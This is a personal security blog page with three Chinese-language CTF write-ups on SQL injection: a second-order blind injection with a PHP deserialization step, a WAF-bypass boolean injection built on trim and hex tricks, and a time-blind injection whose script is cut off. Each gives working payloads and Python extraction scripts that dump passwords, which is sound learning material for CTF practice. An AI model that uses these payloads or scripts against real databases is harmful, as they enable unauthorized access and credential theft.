<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">203</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/09/SQL%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-GACTF-carefulleyes/">SQL二次注入-GACTF-carefulleyes</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-09</time><div class="content"><h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><p>首先看看题目的源码，rename.php在这里是存在二次注入的，新的文件名会替换旧的文件名，新文件名又将被直接取出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($req[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">&#x27;newname&#x27;</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">        $info = $db-&gt;query(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">        $info = $info-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;oldfilename : &quot;</span>.$info[<span class="string">&#x27;filename&#x27;</span>].<span class="string">&quot; will be changed.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>大致分析一下：</strong><br>假设我们输入的文件名为：<br><code>1&#39;or 1=1#.jpg</code>那么插入到数据库当中以后<br>将变成<br><code>1&#39;or 1=1#</code>那么后面取出数据的时候</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &#96;file&#96; where &#96;filename&#96;&#x3D;&#39;&#123;$result[&#39;filename&#39;]&#125;&#39;</span><br><span class="line">select * from &#96;file&#96; where &#96;filename&#96;&#x3D;&#39;1&#39;or 1&#x3D;1#&#39;</span><br></pre></td></tr></table></figure>

<p>一开始测试的时候 我是用and的，但是当我改成1’and 1=2的时候回显结果也是一样的？<code>1&#39;and 1=1#</code><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210810144319.png" alt="img" style="zoom:50%;"></p>
<p>后来我改成了<code>1&#39;or 1=1</code>,发现页面有了不一样的回显</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210810144903.png" alt="img" style="zoom:67%;">

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210810150847.png" alt="img"></p>
<p>所以可以进行布尔盲注</p>
<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>感觉最近写脚本越来越得心应手了虽然脚本都很简单哈哈哈哈</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url1=<span class="string">&quot;http://b.y1ng.vip:2016/upload.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://b.y1ng.vip:2016/rename.php&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>(<span class="params">str</span>):</span></span><br><span class="line">    content=<span class="string">&quot;aaaa&quot;</span></span><br><span class="line">    file1 = &#123;</span><br><span class="line">        <span class="string">&#x27;upfile&#x27;</span>:(<span class="string">f&quot;1&#x27;<span class="subst">&#123;str&#125;</span>#.jpg&quot;</span>,content,<span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(url=url1, files=file1).text</span><br><span class="line">    <span class="comment">#print(r)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">str</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;oldname&quot;</span>:<span class="string">f&quot;1&#x27;<span class="subst">&#123;str&#125;</span>#&quot;</span>,</span><br><span class="line">        <span class="string">&quot;newname&quot;</span>:<span class="string">&quot;abc&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=s.post(url=url2,data=data).text</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">payload</span>):</span></span><br><span class="line">    fina_word=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        low=<span class="number">32</span></span><br><span class="line">        high=<span class="number">128</span></span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">            payload_fina=<span class="string">f&quot;or ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">            upload(payload_fina)</span><br><span class="line">            r=rename(payload_fina)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Comp 1_100002&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high=mid</span><br><span class="line">            mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(mid==<span class="number">32</span> <span class="keyword">or</span> mid==<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        fina_word+=chr(mid)</span><br><span class="line">        print(fina_word)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># payload=&quot;database()&quot;</span></span><br><span class="line">    <span class="comment"># payload=&quot;&quot;</span></span><br><span class="line">    payload=<span class="string">&quot;select group_concat(password) from user&quot;</span></span><br><span class="line">    sql_injection(payload)</span><br></pre></td></tr></table></figure>

<p>这样就可以注出用户名和密码了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">XM GaCtF5QL1</span><br></pre></td></tr></table></figure>

<h2 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($username, $password) = func_get_args();</span><br><span class="line">        $username = strtolower(trim(mysql_escape_string($username)));</span><br><span class="line">        $password = strtolower(trim(mysql_escape_string($password)));</span><br><span class="line"></span><br><span class="line">        $sql = sprintf(<span class="string">&quot;SELECT * FROM user WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;</span>, $username, $password);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        $obj = $db-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">        $obj = $obj-&gt;fetch_assoc();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> $FLAG;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( $obj != <span class="literal">false</span> &amp;&amp; $obj[<span class="string">&#x27;privilege&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>  ) &#123;</span><br><span class="line">			<span class="keyword">die</span>($FLAG);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Admin only!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，只要登录成功，就可以拿到flag，此时我们已经得到账号密码了，构造一下即可,看了一下源码，在upload.php中存在反序列化的点,方法很少，所以pop链其实很好看出，就是destruct的时候会使用call_user_func_array，所以只要对method和args进行赋值即可：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> XCTFGG(<span class="string">&quot;login&quot;</span>,<span class="keyword">array</span>(<span class="string">&quot;XM&quot;</span>,<span class="string">&quot;GaCtF5QL1&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>但是不知道为啥没拿到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload successfully!&lt;br &#x2F;&gt;</span><br><span class="line">&lt;b&gt;Fatal error&lt;&#x2F;b&gt;:  Uncaught Error: Call to undefined function mysql_escape_string() in &#x2F;var&#x2F;www&#x2F;html&#x2F;common.php:39</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#x2F;var&#x2F;www&#x2F;html&#x2F;common.php(59): XCTFGG-&gt;login(&#39;XM&#39;, &#39;GaCtF5QL1&#39;)</span><br><span class="line">#1 &#x2F;var&#x2F;www&#x2F;html&#x2F;upload.php(47): XCTFGG-&gt;__destruct()</span><br><span class="line">#2 &#123;main&#125;</span><br><span class="line">  thrown in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;common.php&lt;&#x2F;b&gt; on line &lt;b&gt;39&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/02/2021-hf-hatenum%E5%A4%8D%E7%8E%B0/">2021-hf-hatenum复现</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-02</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天主要跟着YING师父的wp学习一下其中的知识点~</p>
<h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><p>在login函数中看到，有三种回显，一种是成功，另外一个是error还有一个是fail，所以我们应该构造一个语句，可以有回显error还有fail，那么就是一个要报错一个要false</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$username,$password,$code</span>)</span>&#123;</span><br><span class="line">		$res = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;conn-&gt;error)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$content = $res-&gt;fetch_array();</span><br><span class="line">			<span class="keyword">if</span>($content[<span class="string">&#x27;code&#x27;</span>]===$_POST[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">				$_SESSION[<span class="string">&#x27;username&#x27;</span>] = $content[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">				<span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="string">&#x27;fail&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;		</span><br></pre></td></tr></table></figure>

<p>这里过滤了一系列字符,包括union，select，这里最糟糕的是他过滤了单引号，因为我们通常是采用单引号来闭合语句的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, $str))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Hack detected&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有一个字符数目限制，限制字符长度在9个以内</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">num_waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\d&#123;9&#125;|0x[0-9a-f]&#123;9&#125;/i&#x27;</span>,$str))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Huge num detected&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>由于本题只需要登录即可，所以我们只要获取密码就行了，那么就可以利用源码里面自带的查询语句，这样没有select也没关系，但是引号如何闭合绕过呢？<br>查询语句是这样的：<br>那我们只需要在第二个引号的位置加一下反斜杠将它转义，然后将我们要注入的内容放在password字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;select * from users where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;&quot;</span><br></pre></td></tr></table></figure>

<p>所以就如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;select * from users where username&#x3D;&#39;$username\&#39; and password&#x3D;&#39;||&#96;username&#96;&#x3D;&#39;admin&#39;后面再加上你的注入语句#&quot;</span><br></pre></td></tr></table></figure>

<h3 id="布尔盲注语句构造"><a href="#布尔盲注语句构造" class="headerlink" title="布尔盲注语句构造"></a>布尔盲注语句构造</h3><h4 id="条件语句的选取："><a href="#条件语句的选取：" class="headerlink" title="条件语句的选取："></a>条件语句的选取：</h4><p>由于比较符号都被过滤了，如果使用if显然是不够的，这里我们使用case when<br>初步语句构造为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case &#39;&#39; when &#39;&#39; then &#39;&#39; else &#39;&#39; end#</span><br></pre></td></tr></table></figure>

<p>后面then和else一个发报错的一个放查询错误的</p>
<h4 id="报错函数选取"><a href="#报错函数选取" class="headerlink" title="报错函数选取"></a>报错函数选取</h4><p>报错函数可以用cot(0)或者exp(9999999999999999)都是三角函数</p>
<h4 id="截取函数选择"><a href="#截取函数选择" class="headerlink" title="截取函数选择"></a>截取函数选择</h4><p>由于这里将substr等截取函数都过滤了，所以选择trim()函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trim(leading&#39;&#39;from&#39;&#39;)rlike(trim(leading&#39;&#39;from&#39;&#39;))</span><br></pre></td></tr></table></figure>

<p>这个语句我们在mysql中测试一下将会更直观一些：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trim(leading(&#39;a&#39;)from(&#96;password&#96;)) rlike trim(leading(&#39;b&#39;)from(&#96;password&#96;))</span><br></pre></td></tr></table></figure>


<p>和条件语句组合后即为：以下语句的意思即为如果两个trim的结果如果一致则为1 那么就不是0 那么就会返回1，如果两个trim的结果不一致，那么就会返回0就会返回cot(0)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case trim(leading &#39;a&#39; from &#96;password&#96;) rlike trim(leading &#39;b&#39; from &#96;password&#96;) when 0 then cot(0) else 1 end</span><br></pre></td></tr></table></figure>

<p>可以发现如果截取到密码的字符，那么就会返回错误，否则就会返回表，查询结果即为false<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210802162008.png" alt="img" style="zoom:67%;"></p>
<h4 id="长度绕过："><a href="#长度绕过：" class="headerlink" title="长度绕过："></a>长度绕过：</h4><p>由于我们不能输入引号，所以说字符串都需要转为十六进制进行输入，但是转为十六进制的势必会超过9位数，所以我们可以利用hex和unhex函数缩短长度：<br>先用十进制表示转为十六进制的字符串，那么此时 我们就可以用运算符以及科学技术法，那么位数将会减少很多了，最后再将结果转为十六进制即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select admin;</span><br><span class="line">select unhex(hex(4182e8+96719726e0));</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210802171101.png" alt="img" style="zoom:50%;">
但是字符取到后面还是会超过9位，此时需要另一种方法来截取，那就是使用函数嵌套,我们的问题在于，到后面过多的取字符以后比如说密码为abc，取了abc，那么他们即使转为十进制+科学计数法+运算符，也还是会超过9位，所以我们需要使用嵌套，一部分一部分的取，如下
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210803091136.png" alt="img" style="zoom:50%;">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recursion_g_code</span>(<span class="params">l:list</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">g_code</span>(<span class="params">prefix, code</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;trim(leading(<span class="subst">&#123;wrap_str(prefix)&#125;</span>)from(<span class="subst">&#123;code&#125;</span>))&quot;</span></span><br><span class="line">    code = <span class="string">&quot;&#x27;code&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        code = <span class="string">f&#x27;&#x27;&#x27;g_code(&quot;<span class="subst">&#123;i&#125;</span>&quot;, <span class="subst">&#123;code&#125;</span>)&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> eval(code)</span><br></pre></td></tr></table></figure>

<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>我自己肯定写不出来这么厉害的脚本。。。代码编写能力还是太差，所以就仿照一下自己理解的编写一下：<br>首先是第一段<br><strong>字符串转数字：</strong><br>通过每次取余八位，将后面的数字内容先截取出来，然后转变为科学计数法，然后再将剩下的数字以科学计数法表示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long<span class="comment">#从crypto中导入bytes_to_long函数，这个函数可以将字符串转为长整数</span></span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;字符串转unhex(hex())&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrap_str</span>(<span class="params">s:str</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">split_num</span>(<span class="params">num:int</span>):</span></span><br><span class="line">        p=<span class="number">8</span></span><br><span class="line">        m=pow(<span class="number">10</span>,p)</span><br><span class="line">        parts=[]</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> num &gt;<span class="number">0</span>:</span><br><span class="line">            parts.insert(<span class="number">0</span>,<span class="string">f&quot;<span class="subst">&#123;num % m&#125;</span>e<span class="subst">&#123;i&#125;</span>&quot;</span>)<span class="comment">#insert函数是对list进行操作，表示，第一个数字表示操作的位置，第二个表示插入的内容</span></span><br><span class="line">            i+=p</span><br><span class="line">            num = num // m</span><br><span class="line">        <span class="keyword">if</span> i &gt;=<span class="number">100</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;todo&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;+&quot;</span>.join(parts)</span><br><span class="line">    s=s.encode()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;unhex(hex(<span class="subst">&#123;split_num(bytes_to_long(s))&#125;</span>))&quot;</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210803104243.png" alt="img" style="zoom:67%;">

<p><strong>第二段 trim的套娃</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recursion_g_code</span>(<span class="params">l:list</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">g_code</span>(<span class="params">prefix, code</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;trim(leading(<span class="subst">&#123;wrap_str(prefix)&#125;</span>)from(<span class="subst">&#123;code&#125;</span>))&quot;</span></span><br><span class="line">    code = <span class="string">&quot;&#x27;code&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        code = <span class="string">f&#x27;&#x27;&#x27;g_code(&quot;<span class="subst">&#123;i&#125;</span>&quot;, <span class="subst">&#123;code&#125;</span>)&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> eval(code)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trim(leading(unhex(hex(5033e8+70115431e0)))from(trim(leading(unhex(hex(30057e0)))from(trim(leading(unhex(hex(12851e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(30073e0)))from(trim(leading(unhex(hex(26674e0)))from(trim(leading(unhex(hex(26983e0)))from(trim(leading(unhex(hex(29301e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(25970e0)))from(code))))))))))))))))))))rlike(trim(leading(unhex(hex(5033e8+70115432e0)))from(trim(leading(unhex(hex(30057e0)))from(trim(leading(unhex(hex(12851e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(30073e0)))from(trim(leading(unhex(hex(26674e0)))from(trim(leading(unhex(hex(26983e0)))from(trim(leading(unhex(hex(29301e0)))from(trim(leading(unhex(hex(26472e0)))from(trim(leading(unhex(hex(25970e0)))from(code)))))))))))))))))))))</span><br></pre></td></tr></table></figure>


<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210803160017.png" alt="img" style="zoom:67%;">

<p>可以看到分别是对这三个部分进行递归嵌套</p>
<h2 id="知识点小结："><a href="#知识点小结：" class="headerlink" title="知识点小结："></a>知识点小结：</h2><p>1.引号绕过，两个参数均可控的情况下<br>2.case when else end<br>3.trim函数截取<br>4.字符串转化为大数化短<br>5.记一点小坑，就是在post请求的时候需要allow_redirects=False，否则的话无法接收到正确的报文，原因是源码中在post请求后会有header(location)进行重定向</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/01/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">sql时间盲注</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-01</time><div class="content"><h2 id="前期测试"><a href="#前期测试" class="headerlink" title="前期测试"></a>前期测试</h2><h3 id="确定注入点以及过滤内容"><a href="#确定注入点以及过滤内容" class="headerlink" title="确定注入点以及过滤内容"></a>确定注入点以及过滤内容</h3><p>发现username必须是admin，如果不是admin混有其他字符的话就会返回you are not admin，但是password可以注入，先fuzz一下过滤的字符，过滤substr、union等字符，也过滤了sleep，同时还过滤了空格</p>
<h3 id="确定注入类型"><a href="#确定注入类型" class="headerlink" title="确定注入类型"></a>确定注入类型</h3><p>发现不论输入的内容是什么 页面的回显均是password error，所以尝试一下时间盲注的语句，但是过滤了sleep那么就需要使用benchmark，由于substr以及比较符之类的都没了，所以这里就用in了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;or&#x2F;**&#x2F;case&#x2F;**&#x2F;1&#x2F;**&#x2F;when&#x2F;**&#x2F;1&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;benchmark(1000000,sha1(sha1(sha1(sha1(sha1(sha1(sha1(&#39;HWG&#39;))))))))end#</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210805171825.png" alt="img" style="zoom:67%;">

<h3 id="编写盲注脚本："><a href="#编写盲注脚本：" class="headerlink" title="编写盲注脚本："></a>编写盲注脚本：</h3><p>一开始在写的时候 忘记ascii不见了，所以写的还挺顺的，后来发现不见了，于是就要重新修改一下，想到之前刚学的hex于是就用hex进行书写一下试试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">url=<span class="string">&quot;http://a.y1ng.vip:1102/index.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_tran</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hex(s).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tran_str</span>(<span class="params">g</span>):</span></span><br><span class="line">    tran_tmp=<span class="string">&quot;&quot;</span></span><br><span class="line">    g = binascii.unhexlify(g)</span><br><span class="line">    print(g.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    tran_tmp=g</span><br><span class="line">    print(tran_tmp[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">return</span> tran_tmp[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">payload:str</span>):</span></span><br><span class="line">    wd_tr=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            